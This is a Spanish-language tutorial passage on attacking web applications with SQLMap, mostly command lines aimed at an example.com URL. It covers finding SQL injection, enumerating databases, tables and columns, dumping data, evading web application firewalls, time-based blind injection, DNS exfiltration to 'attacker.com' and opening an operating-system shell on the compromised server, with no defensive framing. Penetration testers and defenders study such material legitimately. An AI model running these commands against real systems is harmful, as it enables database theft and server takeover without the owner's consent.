
1. **Identificación de Vulnerabilidades de Inyección SQL**: SQLMap puede probar una URL específica para identificar si es vulnerable a inyección SQL.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1"`
    
2. **Enumeración de Bases de Datos**: Una vez que se haya identificado una vulnerabilidad, se pueden enumerar las bases de datos disponibles.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs`
    
3. **Enumeración de Tablas**: Después de identificar las bases de datos, se pueden enumerar las tablas dentro de una base de datos específica.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_de_base_de_datos --tables`
    
4. **Enumeración de Columnas**: Una vez que se tienen las tablas, se pueden enumerar las columnas dentro de una tabla específica.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_de_base_de_datos -T nombre_de_tabla --columns`
    
5. **Extracción de Datos**: Finalmente, se pueden extraer datos de una columna específica.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_de_base_de_datos -T nombre_de_tabla -C nombre_de_columna --dump`
    

### Uso Avanzado de SQLMap

1. **Uso de Archivos de Peticiones HTTP**: SQLMap puede utilizar archivos de peticiones HTTP para realizar pruebas más complejas.
    
    bash
    
    Copiar código
    
    `sqlmap -r request.txt`
    
2. **Bypass de WAF (Firewall de Aplicaciones Web)**: SQLMap tiene varias opciones para evadir WAFs.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" --random-agent --tamper=space2comment`
    
3. **Pruebas de Inyección SQL Ciegas (Blind SQL Injection)**: Para manejar inyecciones SQL ciegas, SQLMap puede utilizar técnicas de tiempo.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=T --time-sec=5`
    
4. **Automatización de Ataques**: SQLMap puede realizar múltiples pruebas de inyección SQL en diferentes parámetros de una URL.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1&name=test&age=20" --batch`
    
5. **Uso de Proxy para Auditoría**: SQLMap permite configurar un proxy para monitorizar las peticiones.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://localhost:8080"`
    
6. **Ataques Basados en DNS**: SQLMap puede utilizar técnicas de exfiltración de datos a través de DNS.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" --dns-domain="attacker.com"`
    
7. **Ejecución de Comandos del Sistema Operativo**: SQLMap permite la ejecución de comandos del sistema operativo en el servidor comprometido.
    
    bash
    
    Copiar código
    
    `sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell`